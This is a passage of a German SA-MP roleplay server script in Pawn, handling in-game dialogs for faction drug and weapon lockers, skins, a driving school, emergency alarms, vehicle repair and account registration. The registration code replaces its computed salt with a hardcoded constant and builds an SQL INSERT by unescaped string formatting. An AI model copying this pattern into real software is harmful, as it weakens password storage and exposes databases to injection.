                ShowPlayerDialog(playerid,DIALOG_FLAGER3,DIALOG_STYLE_LIST,"Drogenlager","Drogen Status\nDrogen einzahlen\nDrogen herausnehmen","Weiter","Zurück");
			}
			if(listitem == 2)
			{
				if(fmerken[playerid] == 0)
				{
					ShowPlayerDialog(playerid,DIALOG_SKINB,DIALOG_STYLE_LIST,"Skin auswählen","Skin 1\nSkin 2\nSkin 3\nSkin 4","Auswählen","");
				}
				if(fmerken[playerid] == 1)
				{
					ShowPlayerDialog(playerid,DIALOG_SKING,DIALOG_STYLE_LIST,"Skin auswählen","Skin 1\nSkin 2\nSkin 3\nSkin 4\nSkin 5","Auswählen","");
				}
				if(fmerken[playerid] == 2)
				{
					ShowPlayerDialog(playerid,DIALOG_SKINA,DIALOG_STYLE_LIST,"Skin auswählen","Skin 1\nSkin 2\nSkin 3\nSkin 4\nSkin 5\nSkin 6","Auswählen","");
				}
				if(fmerken[playerid] == 3)
				{
					ShowPlayerDialog(playerid,DIALOG_SKINL,DIALOG_STYLE_LIST,"Skin auswählen","Skin 1\nSkin 2\nSkin 3\nSkin 4\nSkin 5\nSkin 6","Auswählen","");
				}
				if(fmerken[playerid] == 4)
				{
					ShowPlayerDialog(playerid,DIALOG_SKINY,DIALOG_STYLE_LIST,"Skin auswählen","Skin 1\nSkin 2\nSkin 3\nSkin 4\nSkin 5\nSkin 6","Auswählen","");
				}
				if(fmerken[playerid] == 5)
				{
					ShowPlayerDialog(playerid,DIALOG_SKINVA,DIALOG_STYLE_LIST,"Skin auswählen","Skin 1\nSkin 2\nSkin 3","Auswählen","");
				}
				if(fmerken[playerid] == 6)
				{
					ShowPlayerDialog(playerid,DIALOG_SKINBI,DIALOG_STYLE_LIST,"Skin auswählen","Skin 1\nSkin 2\nSkin 3\nSkin 4","Auswählen","");
				}

			}
		}
	}
	else if(dialogid == DIALOG_SKINBI)
	{
	    if(response)
	    {
	        new skin;
			if(listitem == 0)
			{
				skin = 246;
			}
			if(listitem == 1)
			{
                skin = 247;
			}
			if(listitem == 2)
			{
                skin = 248;
			}
			if(listitem == 3)
			{
                skin = 254;
			}
			SetPlayerSkin(playerid,skin);
			SpielerInfo[playerid][uSkin] = skin;
			SpielerInfo[playerid][uZiviFrak] = 1;
			ShowPlayerDialog(playerid,DIALOG_FLAGER,DIALOG_STYLE_LIST,"Spind","Waffen\nDrogen\nSkins","Auswählen","Abbrechen");
	    }
	}
	else if(dialogid == DIALOG_SKINVA)
	{
	    if(response)
	    {
	        new skin;
			if(listitem == 0)
			{
				skin = 108;
			}
			if(listitem == 1)
			{
                skin = 109;
			}
			if(listitem == 2)
			{
                skin = 110;
			}
			SetPlayerSkin(playerid,skin);
			SpielerInfo[playerid][uSkin] = skin;
			SpielerInfo[playerid][uZiviFrak] = 1;
			ShowPlayerDialog(playerid,DIALOG_FLAGER,DIALOG_STYLE_LIST,"Spind","Waffen\nDrogen\nSkins","Auswählen","Abbrechen");
	    }
	}
	else if(dialogid == DIALOG_SKINY)
	{
	    if(response)
	    {
	        new skin;
			if(listitem == 0)
			{
				skin = 123;
			}
			if(listitem == 1)
			{
                skin = 186;
			}
			if(listitem == 2)
			{
                skin = 203;
			}
			if(listitem == 3)
			{
                skin = 204;
			}
			if(listitem == 4)
			{
                skin = 224;
			}
			if(listitem == 5)
			{
                skin = 169;
			}
			SetPlayerSkin(playerid,skin);
			SpielerInfo[playerid][uSkin] = skin;
			SpielerInfo[playerid][uZiviFrak] = 1;
			ShowPlayerDialog(playerid,DIALOG_FLAGER,DIALOG_STYLE_LIST,"Spind","Waffen\nDrogen\nSkins","Auswählen","Abbrechen");
	    }
	}
	else if(dialogid == DIALOG_SKINL)
	{
	    if(response)
	    {
	        new skin;
			if(listitem == 0)
			{
				skin = 126;
			}
			if(listitem == 1)
			{
                skin = 125;
			}
			if(listitem == 2)
			{
                skin = 124;
			}
			if(listitem == 3)
			{
                skin = 113;
			}
			if(listitem == 4)
			{
                skin = 111;
			}
			if(listitem == 5)
			{
                skin = 112;
			}
			SetPlayerSkin(playerid,skin);
			SpielerInfo[playerid][uSkin] = skin;
			SpielerInfo[playerid][uZiviFrak] = 1;
			ShowPlayerDialog(playerid,DIALOG_FLAGER,DIALOG_STYLE_LIST,"Spind","Waffen\nDrogen\nSkins","Auswählen","Abbrechen");
	    }
	}
	else if(dialogid == DIALOG_SKINA)
	{
	    if(response)
	    {
	        new skin;
			if(listitem == 0)
			{
				skin = 114;
			}
			if(listitem == 1)
			{
                skin = 115;
			}
			if(listitem == 2)
			{
                skin = 116;
			}
			if(listitem == 3)
			{
                skin = 173;
			}
			if(listitem == 4)
			{
                skin = 174;
			}
			if(listitem == 5)
			{
                skin = 175;
			}
			SetPlayerSkin(playerid,skin);
			SpielerInfo[playerid][uSkin] = skin;
			SpielerInfo[playerid][uZiviFrak] = 1;
			ShowPlayerDialog(playerid,DIALOG_FLAGER,DIALOG_STYLE_LIST,"Spind","Waffen\nDrogen\nSkins","Auswählen","Abbrechen");
	    }
	}
	else if(dialogid == DIALOG_SKING)
	{
	    if(response)
	    {
	        new skin;
			if(listitem == 0)
			{
				skin = 105;
			}
			if(listitem == 1)
			{
                skin = 106;
			}
			if(listitem == 2)
			{
                skin = 107;
			}
			if(listitem == 3)
			{
                skin = 269;
			}
			if(listitem == 4)
			{
                skin = 271;
			}
			SetPlayerSkin(playerid,skin);
			SpielerInfo[playerid][uSkin] = skin;
			SpielerInfo[playerid][uZiviFrak] = 1;
			ShowPlayerDialog(playerid,DIALOG_FLAGER,DIALOG_STYLE_LIST,"Spind","Waffen\nDrogen\nSkins","Auswählen","Abbrechen");
	    }
	}
	else if(dialogid == DIALOG_SKINB)
	{
	    if(response)
	    {
	        new skin;
			if(listitem == 0)
			{
				skin = 102;
			}
			if(listitem == 1)
			{
                skin = 103;
			}
			if(listitem == 2)
			{
                skin = 104;
			}
			if(listitem == 3)
			{
                skin = 13;
			}
			SetPlayerSkin(playerid,skin);
			SpielerInfo[playerid][uSkin] = skin;
			SpielerInfo[playerid][uZiviFrak] = 1;
			ShowPlayerDialog(playerid,DIALOG_FLAGER,DIALOG_STYLE_LIST,"Spind","Waffen\nDrogen\nSkins","Auswählen","Abbrechen");
	    }
	}
	else if(dialogid == DIALOG_FLAGER3)
	{
	    if(response)
	    {
		    if(listitem == 0)
		    {
		        new str[150];
		        format(str,sizeof(str),"Gras: %d",LInfo[fmerken[playerid]][drogenn]);
		        ShowPlayerDialog(playerid,DIALOG_FLAGER6,DIALOG_STYLE_MSGBOX,"Drogen Status",str,"Zurück","");
		    }
	        if(listitem == 1)
	        {
                ShowPlayerDialog(playerid,DIALOG_FLAGER7,DIALOG_STYLE_INPUT,"Drogen einzahlen","Wie viele Drogen möchtest du in den Spind geben?","Geben","Zurück");
	        }
	        if(listitem == 2)
	        {
                ShowPlayerDialog(playerid,DIALOG_FLAGER8,DIALOG_STYLE_INPUT,"Drogen auszahlen","Wie viele Drogen möchtest du aus dem Spind nehmen?","Nehmen","Zurück");
	        }
	    }else{ShowPlayerDialog(playerid,DIALOG_FLAGER,DIALOG_STYLE_LIST,"Spind","Waffen\nDrogen\nSkins","Auswählen","Abbrechen");}
	}
	else if(dialogid == DIALOG_FLAGER7)
	{
	    if(response)
	    {
	        new str[80], hatdrogen[MAX_PLAYERS];
         	hatdrogen[playerid] = 0;
	        for(new x = 0; x < sizeof(SpielerInventar[]); x++)
	        {
	            if(InventarValues[SpielerInventar[playerid][x][0]][iModell] == 1578)
	            {
	                new eing = strval(inputtext);
					if(eing > 0)
					{
					    if(SpielerInventar[playerid][x][1] >= eing)
					    {
					        SpielerInventar[playerid][x][1] -= eing;
					        LInfo[fmerken[playerid]][drogenn] += eing;
             				if(SpielerInventar[playerid][x][1] == 0)
		                    {
		                        SpielerInventar[playerid][x][0] = -1;
		                        PlayerTextDrawHide(playerid,SpielerInventarText[playerid][x+7]);
								PlayerTextDrawSetString(playerid,SpielerInventarText[playerid][x+22],"0");
		                    }
		                    hatdrogen[playerid] = 1;
		                    format(str,sizeof(str),"Du hast %dg Drogen eingezahlt!",eing);
		                    SendClientMessage(playerid,COLOR_GREEN,str);
					    }else{SendClientMessage(playerid,COLOR_RED,"Du hast nicht soviele Drogen!"); ShowPlayerDialog(playerid,DIALOG_FLAGER7,DIALOG_STYLE_INPUT,"Drogen einzahlen","Wie viele Drogen möchtest du in den Spind geben?","Geben","Zurück");}
					}else{SendClientMessage(playerid,COLOR_RED,"Wert muss über 0 sein!"); ShowPlayerDialog(playerid,DIALOG_FLAGER7,DIALOG_STYLE_INPUT,"Drogen einzahlen","Wie viele Drogen möchtest du in den Spind geben?","Geben","Zurück");}
	            }else{SendClientMessage(playerid,COLOR_RED,"Du besitzt keine Drogen!");}
	        }
	    }else{ShowPlayerDialog(playerid,DIALOG_FLAGER3,DIALOG_STYLE_LIST,"Drogenlager","Drogen Status\nDrogen einzahlen\nDrogen herausnehmen","Weiter","Zurück");}
	}
	else if(dialogid == DIALOG_FLAGER8)
	{
	    if(response)
	    {
	        new str[80];
            new eing = strval(inputtext);
			if(eing > 0)
			{
			    if(LInfo[fmerken[playerid]][drogenn] >= eing)
			    {
			        LInfo[fmerken[playerid]][drogenn] -= eing;
			        Verstauen(playerid,1578,eing);
                    format(str,sizeof(str),"Du hast %dg Drogen genommen!",eing);
                    SendClientMessage(playerid,COLOR_GREEN,str);
			    } else{SendClientMessage(playerid,COLOR_RED,"Soviele Drogen sind nicht im Spind!");ShowPlayerDialog(playerid,DIALOG_FLAGER8,DIALOG_STYLE_INPUT,"Drogen auszahlen","Wie viele Drogen möchtest du aus dem Spind nehmen?","Nehmen","Zurück");}
	        } else{SendClientMessage(playerid,COLOR_RED,"Wert muss über 0 sein!");ShowPlayerDialog(playerid,DIALOG_FLAGER8,DIALOG_STYLE_INPUT,"Drogen auszahlen","Wie viele Drogen möchtest du aus dem Spind nehmen?","Nehmen","Zurück");}
	    }else{ShowPlayerDialog(playerid,DIALOG_FLAGER3,DIALOG_STYLE_LIST,"Drogenlager","Drogen Status\nDrogen einzahlen\nDrogen herausnehmen","Weiter","Zurück");}
	}
	else if(dialogid == DIALOG_FLAGER6)
	{
	    if(response)
	    {
	        ShowPlayerDialog(playerid,DIALOG_FLAGER3,DIALOG_STYLE_LIST,"Drogenlager","Drogen Status\nDrogen einzahlen\nDrogen herausnehmen","Weiter","Zurück");
	    }
	}
	else if(dialogid == DIALOG_FLAGER2)
	{
		if(response)
		{
		    if(listitem == 0)
		    {
		        new str[150];
		        format(str,sizeof(str),"Mats Guthaben: %d",LInfo[fmerken[playerid]][matss]);
		        ShowPlayerDialog(playerid,DIALOG_FLAGER4,DIALOG_STYLE_MSGBOX,"Mats Guthaben",str,"Zurück","");
		    }
		    if(listitem == 1)
		    {
		        ShowPlayerDialog(playerid,DIALOG_FLAGER5,DIALOG_STYLE_LIST,"Waffe herausnehmen","Messer 1 Mats\n9mm 4 Mats\nDeagle 10 Mats\nMicro SMG/UZI 12 Mats\nAK-47 15 Mats\nTec-9 10 Mats\nCountry Rifle 8 Mats","Nehmen","Zurück");
		    }
		}else{ShowPlayerDialog(playerid,DIALOG_FLAGER,DIALOG_STYLE_LIST,"Spind","Waffen\nDrogen\nSkins","Auswählen","Abbrechen");}
	}
	else if(dialogid == DIALOG_FLAGER4)
	{
	    if(response)
	    {
	        ShowPlayerDialog(playerid,DIALOG_FLAGER2,DIALOG_STYLE_LIST,"Waffenlager","Mats Status\nWaffe herausnehmen","Weiter","Zurück");
	    }
	}
	else if(dialogid == DIALOG_FLAGER5)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
	            if(LInfo[fmerken[playerid]][matss] >= 1)
	            {
	            	GebeWaffe(playerid,4,1);
	            	LInfo[fmerken[playerid]][matss] -= 1;
				}else{SendClientMessage(playerid,COLOR_RED,"Das Fraktionslager hat nicht genug Mats!");}
	        }
	        if(listitem == 1)
	        {
	            if(LInfo[fmerken[playerid]][matss] >= 4)
	            {
	            	GebeWaffe(playerid,22,80);
	            	LInfo[fmerken[playerid]][matss] -= 4;
				}else{SendClientMessage(playerid,COLOR_RED,"Das Fraktionslager hat nicht genug Mats!");}
	        }
			if(listitem == 2)
	        {
	            if(LInfo[fmerken[playerid]][matss] >= 10)
	            {
	            	GebeWaffe(playerid,24,50);
	            	LInfo[fmerken[playerid]][matss] -= 10;
				}else{SendClientMessage(playerid,COLOR_RED,"Das Fraktionslager hat nicht genug Mats!");}
	        }
	        if(listitem == 3)
	        {
	            if(LInfo[fmerken[playerid]][matss] >= 12)
	            {
	            	GebeWaffe(playerid,28,120);
	            	LInfo[fmerken[playerid]][matss] -= 12;
				}else{SendClientMessage(playerid,COLOR_RED,"Das Fraktionslager hat nicht genug Mats!");}
	        }
	        if(listitem == 4)
	        {
	            if(LInfo[fmerken[playerid]][matss] >= 15)
	            {
	            	GebeWaffe(playerid,30,150);
	            	LInfo[fmerken[playerid]][matss] -= 15;
				}else{SendClientMessage(playerid,COLOR_RED,"Das Fraktionslager hat nicht genug Mats!");}
	        }
	        if(listitem == 5)
	        {
	            if(LInfo[fmerken[playerid]][matss] >= 10)
	            {
	            	GebeWaffe(playerid,32,90);
	            	LInfo[fmerken[playerid]][matss] -= 10;
				}else{SendClientMessage(playerid,COLOR_RED,"Das Fraktionslager hat nicht genug Mats!");}
	        }
	        if(listitem == 6)
	        {
	            if(LInfo[fmerken[playerid]][matss] >= 8)
	            {
	            	GebeWaffe(playerid,33,20);
	            	LInfo[fmerken[playerid]][matss] -= 8;
				}else{SendClientMessage(playerid,COLOR_RED,"Das Fraktionslager hat nicht genug Mats!");}
	        }
	        ShowPlayerDialog(playerid,DIALOG_FLAGER5,DIALOG_STYLE_LIST,"Waffe herausnehmen","Messer 1 Mats\n9mm 4 Mats\nDeagle 10 Mats\nMicro SMG/UZI 12 Mats\nAK-47 15 Mats\nTec-9 10 Mats\nCountry Rifle 8 Mats","Nehmen","Zurück");
	    }
	    else
	    {
	    	ShowPlayerDialog(playerid,DIALOG_FLAGER2,DIALOG_STYLE_LIST,"Waffenlager","Mats Status\nWaffe herausnehmen","Weiter","Zurück");
	    }
	}
	else if(dialogid == DIALOG_PW)
	{
	    if(failpw[playerid] < 3)
	    {
		    if(response)
		    {
			    if(PASSWORD == strval(inputtext))
			    {
			        SetTimerEx("loginfenster",2000,0,"d",playerid);
					SetTimerEx("ladefenster",2001,0,"d",playerid);
					SendClientMessage(playerid,COLOR_GREEN,"Passwort richtig!");

			    }else
				{
				    failpw[playerid] ++;
                    SendClientMessage(playerid,COLOR_RED,"Passwort Falsch!");
                    ShowPlayerDialog(playerid,DIALOG_PW,DIALOG_STYLE_INPUT,"Server Passwort","Gebe das Passwort erneut ein:","Senden","");
				}
			}
			else{
			    Kick(playerid);

			}
		}
		else
		{
		    Kick(playerid);
		}
	}
	else if(dialogid == DIALOG_FUHR)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
	            if(SpielerInfo[playerid][uGeld] >= 70)
	            {
            	    if(SpielerInfo[playerid][uTheorie] == 0)
			     	{
			     	   	new dialogstr[800] = "Willkommen bei der theoretischen Fahrprüfung.\nDu erhälst nun einige Informationen - Präge dir diese gut ein, du musst anschließend einige Fragen beantworten:\n\n- Innenorts ist eine Maximalgeschwindigkeit von 80 KM/H einzuhalten.\n- Sollte sich ein Einsatzwagen mit eingeschalteter Sirene nähern, so muss man Rechts ran fahren und stehen bleiben bis das Fahrzeug vorbei ist.\n- Ampeln müssen immer eingehalten werden.\n";
     	    			strcat(dialogstr,"- An Kreuzungen mit Beschilderungen hat das Fahrzeug mit dem dreieckigen Schild (Innen weiß außen rot) Vorfahrt.\n- Das Überholen von Fahrzeugen ist nur Außenorts erlaubt.\n- Es ist Pflicht die Autoscheinwerfer von 20:00 - 6:00 Uhr einzuschalten.\n- Fahrzeuge dürfen ausschließlich auf Parklätzen und Grundstücken geparkt werden!");
     	    			ShowPlayerDialog(playerid,DIALOG_THEORIE,DIALOG_STYLE_MSGBOX,"Theorieprüfung",dialogstr,"OK","");
     	    			GebeGeld(playerid,-70);
     	    			BizInfo[5][bkasse] += 70.0; Geschaftspeichern(5);
			   		}
			     	else
			      	{
			       		SendClientMessage(playerid,COLOR_RED,"Du hast die theoretische Prüfung bereits bestanden!");
			       	}
				}else{SendClientMessage(playerid,COLOR_RED,"Du hast nicht genug Geld!");}
	        }
	        if(listitem == 1)
	        {
	            if(SpielerInfo[playerid][uTheorie] == 0) return SendClientMessage(playerid,COLOR_RED,"Du brauchst erst die Theorie Prüfung!");
                if(SpielerInfo[playerid][uFuehrerschein] == 1) return SendClientMessage(playerid,COLOR_RED,"Du hast bereits den Autoführerschein");
                if(SpielerInfo[playerid][uGeld] >= 200)
                {
                    //GebeGeld(playerid,-200);
	                SendClientMessage(playerid,COLOR_GREEN,"Praktische Prüfung: Steige draussen in eins der weißen Fahrschulautos.");
	                Fahrstunde[playerid] = 1;
			 	}else SendClientMessage(playerid,COLOR_RED,"Du hast nicht Genug Geld!");

	        }
	        if(listitem == 2)
	        {
                if(SpielerInfo[playerid][uTheorie] == 0) return SendClientMessage(playerid,COLOR_RED,"Du brauchst erst die Theorie Prüfung!");
                if(SpielerInfo[playerid][uMotorradschein] == 1) return SendClientMessage(playerid,COLOR_RED,"Du hast bereits den Motorradführerschen");
                if(SpielerInfo[playerid][uGeld] >= 400)
                {
                    //GebeGeld(playerid,-1000);
					SendClientMessage(playerid,COLOR_GREEN,"Gehe aus der Fahrschule und steige auf ein Motorrad.");
	                Fahrstunde[playerid] = 2;
				}else SendClientMessage(playerid,COLOR_RED,"Du hast nicht Genug Geld!");
			}
	        if(listitem == 3)
	        {
                if(SpielerInfo[playerid][uTheorie] == 0) return SendClientMessage(playerid,COLOR_RED,"Du brauchst erst die Theorie Prüfung!");
                if(SpielerInfo[playerid][uLKWschein] == 1) return SendClientMessage(playerid,COLOR_RED,"Du hast bereits den LKW-Führerschein");
                if(SpielerInfo[playerid][uGeld] >= 600)
                {
                    //GebeGeld(playerid,-600);
	                SendClientMessage(playerid,COLOR_GREEN,"Gehe aus der Fahrschule und steige in ein LKW ein.");
	                Fahrstunde[playerid] = 3;
				}else SendClientMessage(playerid,COLOR_RED,"Du hast nicht Genug Geld!");
			}

		}
	}
	else if(dialogid == DIALOG_ALARMIERUNG)
	{
		if(response)
	    {
	        if(listitem == 0)
	        {
                for(new i = 0; i < MAX_PLAYERS; i++){
    				if(IstSpielerInFrak(i,3) || IstSpielerInFrak(i,4)){
           				PlayAudioStreamForPlayer(i, "https://county-islands.com/sounds/funkwecker.mp3");
         				SendClientMessage(i,COLOR_RED,"Einsatzmeldung: Bitte umgehend zum Fire & Rescue Gebäude kommen!");
	 				}
				}
			}
	        if(listitem == 1)
	        {
	            if(sirenean == 0)
	            {
		            for(new i = 0; i < MAX_PLAYERS; i++)
					{
					    sirenean = 1;
			            PlayAudioStreamForPlayer(i, "https://county-islands.com/sounds/sirene.mp3",1773.2511,-9346.1758,4.4124,400.0, 1);
                        SendClientMessage(i,COLOR_RED,"Einsatzmeldung: Sirene in Lake Sorten aktiviert/deaktiviert.");
					}
				}
				else{
					for(new i = 0; i < MAX_PLAYERS; i++)
					{
					    sirenean = 0;
				    	StopAudioStreamForPlayer(i);
					}
				}
    		}
    		if(listitem == 2)
    		{
    			CallLocalFunction("cmd_einsatz","d",playerid);
    		}
    		if(listitem == 3)
    		{
    			CallLocalFunction("cmd_spuren","d",playerid);
    		}
	    }
	}
	else if(dialogid == DIALOG_SERVICE)
	{
	    if(response)
	    {
	        new str[120],stro[150];
	        if(listitem == 0)
	        {
       			new Float:LS12 = GetPlayerDistanceFromPoint(playerid, 1763.3220,-9308.4346,4.4164);
	    		new Float:SF12 = GetPlayerDistanceFromPoint(playerid, 6502.8628,-7872.9336,4.6186);
	    		if(LS12 > SF12)
	    		{
	    			format(stro,sizeof(stro),"Der Notruf ist geeignet für das Santa Felton Police Department");
	    		}
	    		else if(SF12 > LS12)
	    		{
	    		    format(stro,sizeof(stro),"Der Notruf ist geeignet für das Lake Sorten Police Department");
	    		}
	            format(str,sizeof(str),"HQ: %s[%d] fordert einen Streifenwagen an. Benutze /notrufe",PlayerName(playerid),playerid);
	            FraktionsNachricht(1, COLOR_HQ, str);
	            FraktionsNachricht(2, COLOR_HQ, str);
	            FraktionsNachricht(1, COLOR_HQ, stro);
	            FraktionsNachricht(2, COLOR_HQ, stro);
	            SendClientMessage(playerid,COLOR_BLUE,"Auftrag abgesendet!");
	            auftragsid[playerid] = 1;
	        }
	        if(listitem == 1)
	        {
     			format(str,sizeof(str),"HQ: %s[%d] fordert Fire & Rescue an. Benutze /notrufe",PlayerName(playerid),playerid);
	            FraktionsNachricht(3, COLOR_HQ, str);
	            FraktionsNachricht(4, COLOR_HQ, str);
	            SendClientMessage(playerid,COLOR_BLUE,"Auftrag abgesendet!");
	            auftragsid[playerid] = 2;
	        }
	        if(listitem == 2)
	        {
	            for(new i = 0; i < MAX_PLAYERS; i++)
	            {
	                if(GetVehicleModel(GetPlayerVehicleID(i)) == 420 && GetPlayerState(i) == PLAYER_STATE_DRIVER || GetVehicleModel(GetPlayerVehicleID(i)) == 438 && GetPlayerState(i) == PLAYER_STATE_DRIVER)
	                {
		     			format(str,sizeof(str),"%s[%d] fordert ein Taxi. Benutzer /taxis",PlayerName(playerid),playerid);
			            SendClientMessage(i, COLOR_BLUE, str);
			            auftragsid[playerid] = 5;
					}
				}
				SendClientMessage(playerid,COLOR_BLUE,"Auftrag abgesendet!");

	        }
	    }
	}
	else if(dialogid == DIALOG_FREIK)
	{
	    if(response)
	    {
	        if(SpielerInfo[playerid][uGeld] >= 120)
	        {
			    SAuto[playerid][autokey[playerid]][abgeschleppt] = 0;
			    SendClientMessage(playerid,COLOR_GREEN,"Du hast dein Fahrzeug freigekauft.");
			    autokey[playerid] = -1;
			    GebeGeld(playerid,-120);
			    Fraktionskasse[3] += 60;
			    Frakkassespeichern(3);
			    Fraktionskasse[4] += 60;
			    Frakkassespeichern(4);
			}else
			{
				RemovePlayerFromVehicle(playerid);
		    	SendClientMessage(playerid,COLOR_RED,"Du hast nicht genug Geld.");
		    	autokey[playerid] = -1;
			}
		}
		else
		{
		    RemovePlayerFromVehicle(playerid);
		    SendClientMessage(playerid,COLOR_RED,"Dann eben nicht.");
		    autokey[playerid] = -1;
		}
	}
	if(dialogid == DIALOG_REPA1)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
	            if(SAuto[playerid][0][sID] == -2)
	            {
	                if(SAuto[playerid][0][sreperatur] == 1)
	                {
	                    if(SpielerInfo[playerid][uGeld] < 169)return SendClientMessage(playerid,COLOR_RED,"Dein Geld reicht nicht aus, die Reperatur kostet 170$");
	                    new i = 0;
	                    if(PrivcarRep == 0)
					    {
					        SAuto[playerid][i][sX] = 1743.2921;
					        SAuto[playerid][i][sY] = -9360.2471;
					        SAuto[playerid][i][sZ] = 4.0351;
					        SAuto[playerid][i][sA] = 178.9530;
					        PrivcarRep = 1;
					    }
					    else if(PrivcarRep == 1)
					    {
					        SAuto[playerid][i][sX] = 1738.1223;
					        SAuto[playerid][i][sY] = -9360.2471;
					        SAuto[playerid][i][sZ] = 4.0351;
					        SAuto[playerid][i][sA] = 178.9530;
					        PrivcarRep = 2;
					    }
					    else if(PrivcarRep == 2)
					    {
					        SAuto[playerid][i][sX] = 1733.2460;
					        SAuto[playerid][i][sY] = -9360.2471;
					        SAuto[playerid][i][sZ] = 4.0351;
					        SAuto[playerid][i][sA] = 178.9530;
					        PrivcarRep = 3;
					    }
					    else
					    {
					        SAuto[playerid][i][sX] = 1748.1538;
					        SAuto[playerid][i][sY] = -9360.2471;
					        SAuto[playerid][i][sZ] = 4.0351;
					        SAuto[playerid][i][sA] = 178.9530;
					        PrivcarRep = 0;
					    }
	                    SAuto[playerid][i][sID] = CreateVehicle(SAuto[playerid][i][sModel],SAuto[playerid][i][sX],SAuto[playerid][i][sY],SAuto[playerid][i][sZ],SAuto[playerid][i][sA],SAuto[playerid][i][sFarbe1],SAuto[playerid][i][sFarbe2],-1);
				        SetVehicleNumberPlate(SAuto[playerid][i][sID],SAuto[playerid][i][sKennzeichen]);
						SetVehicleToRespawn(SAuto[playerid][i][sID]);
						Benzin[SAuto[playerid][i][sID]] = AutoDaten[SAuto[playerid][i][sModel]-399][MaxBenzin];
						Meter2[SAuto[playerid][i][sID]] = 0;
						Motorschaden2[SAuto[playerid][i][sID]] = 0;
						SAuto[playerid][i][sMotorschaden] = 0;
						Meter[SAuto[playerid][i][sID]] = SAuto[playerid][i][sKilometer]*250;
						SaveCoords(SAuto[playerid][i][sID]);
						new engine, lights, alarm, doors, bonnet, boot, objective;
						GetVehicleParamsEx(SAuto[playerid][i][sID], engine, lights, alarm, doors, bonnet, boot, objective);
						SetVehicleParamsEx(SAuto[playerid][i][sID], engine, lights, alarm, VEHICLE_PARAMS_ON, bonnet, boot, objective);
						SAuto[playerid][i][sreperatur] = 0;
						AddVehicleComponent(SAuto[playerid][i][sID],SAuto[playerid][i][sNitro]);
						AddVehicleComponent(SAuto[playerid][i][sID],SAuto[playerid][i][sHydraulik]);
						SendClientMessage(playerid,COLOR_GREEN,"Du hast dein Fahrzeug repariert. Das kostet dich 170$. Hole es ab! (Checkpoint) ");
						GebeGeld(playerid,-170);
						SetPlayerCheckpoint(playerid,SAuto[playerid][i][sX],SAuto[playerid][i][sY],SAuto[playerid][i][sZ]-1,3.0);
						cpaktiv[playerid] = 1;
						Tuningladen(playerid,0);

	                }
	                else{SendClientMessage(playerid,COLOR_RED,"Dieses Fahrzeug ist nicht kaputt!");}
	            }else{SendClientMessage(playerid,COLOR_RED,"Auf diesem Slot ist kein Fahrzeug!");}
	        }
	        if(listitem == 1)
	        {
	            if(SAuto[playerid][1][sID] == -2)
	            {
	                if(SAuto[playerid][1][sreperatur] == 1)
	                {
	                    if(SpielerInfo[playerid][uGeld] < 169)return SendClientMessage(playerid,COLOR_RED,"Dein Geld reicht nicht aus, die Reperatur kostet 170$");
	                    new i = 1;
	                    if(PrivcarRep == 0)
					    {
					        SAuto[playerid][i][sX] = 1743.2921;
					        SAuto[playerid][i][sY] = -9360.2471;
					        SAuto[playerid][i][sZ] = 4.0351;
					        SAuto[playerid][i][sA] = 178.9530;
					        PrivcarRep = 1;
					    }
					    else if(PrivcarRep == 1)
					    {
					        SAuto[playerid][i][sX] = 1738.1223;
					        SAuto[playerid][i][sY] = -9360.2471;
					        SAuto[playerid][i][sZ] = 4.0351;
					        SAuto[playerid][i][sA] = 178.9530;
					        PrivcarRep = 2;
					    }
					    else if(PrivcarRep == 2)
					    {
					        SAuto[playerid][i][sX] = 1733.2460;
					        SAuto[playerid][i][sY] = -9360.2471;
					        SAuto[playerid][i][sZ] = 4.0351;
					        SAuto[playerid][i][sA] = 178.9530;
					        PrivcarRep = 3;
					    }
					    else
					    {
					        SAuto[playerid][i][sX] = 1748.1538;
					        SAuto[playerid][i][sY] = -9360.2471;
					        SAuto[playerid][i][sZ] = 4.0351;
					        SAuto[playerid][i][sA] = 178.9530;
					        PrivcarRep = 0;
					    }
	                    SAuto[playerid][i][sID] = CreateVehicle(SAuto[playerid][i][sModel],SAuto[playerid][i][sX],SAuto[playerid][i][sY],SAuto[playerid][i][sZ],SAuto[playerid][i][sA],-1,-1,-1);
				        SetVehicleNumberPlate(SAuto[playerid][i][sID],SAuto[playerid][i][sKennzeichen]);
						SetVehicleToRespawn(SAuto[playerid][i][sID]);
						Benzin[SAuto[playerid][i][sID]] = AutoDaten[SAuto[playerid][i][sModel]-399][MaxBenzin];
						Meter2[SAuto[playerid][i][sID]] = 0;
						Meter[SAuto[playerid][i][sID]] = SAuto[playerid][i][sKilometer]*250;
						Motorschaden2[SAuto[playerid][i][sID]] = 0;
						SAuto[playerid][i][sMotorschaden] = 0;
						SaveCoords(SAuto[playerid][i][sID]);
						new engine, lights, alarm, doors, bonnet, boot, objective;
						GetVehicleParamsEx(SAuto[playerid][i][sID], engine, lights, alarm, doors, bonnet, boot, objective);
						SetVehicleParamsEx(SAuto[playerid][i][sID], engine, lights, alarm, VEHICLE_PARAMS_ON, bonnet, boot, objective);
						SAuto[playerid][i][sreperatur] = 0;
						AddVehicleComponent(SAuto[playerid][i][sID],SAuto[playerid][i][sNitro]);
						AddVehicleComponent(SAuto[playerid][i][sID],SAuto[playerid][i][sHydraulik]);
						SendClientMessage(playerid,COLOR_GREEN,"Du hast dein Fahrzeug repariert. Das kostet dich 170$. Hole es ab! (Checkpoint) ");
						GebeGeld(playerid,-170);
						SetPlayerCheckpoint(playerid,SAuto[playerid][i][sX],SAuto[playerid][i][sY],SAuto[playerid][i][sZ]-1,3.0);
						cpaktiv[playerid] = 1;
						Tuningladen(playerid,1);
	                }
	                else{SendClientMessage(playerid,COLOR_RED,"Dieses Fahrzeug ist nicht kaputt!");}
	            }else{SendClientMessage(playerid,COLOR_RED,"Auf diesem Slot ist kein Fahrzeug!");}
	        }
	    }
	    else
	    {
	        SendClientMessage(playerid,COLOR_RED,"Vorgang abgebrochen.");
	    }
	}
	else if(dialogid == Registrieren)
	{
	    if(!strlen(inputtext)) return ShowPlayerDialog(playerid,Registrieren,DIALOG_STYLE_PASSWORD,"Registrierung","Gebe hier dein gewünschtes Passwort ein:","Registrieren","");
	    new updatestring[256],salt[41];
	    format(updatestring,sizeof updatestring,"%d",getdate());
 		sha1(updatestring,salt);
 		salt = "9d8974baddfc0e53300829f37e5fc88b0f5ce61b";
   		format(updatestring,sizeof updatestring,"INSERT INTO login (Name,Passwort,salt) VALUES ('%s','%s','%s')",PlayerName(playerid),verschluesseln(inputtext,salt),salt);
    	mysql_query(dbhandle, updatestring);
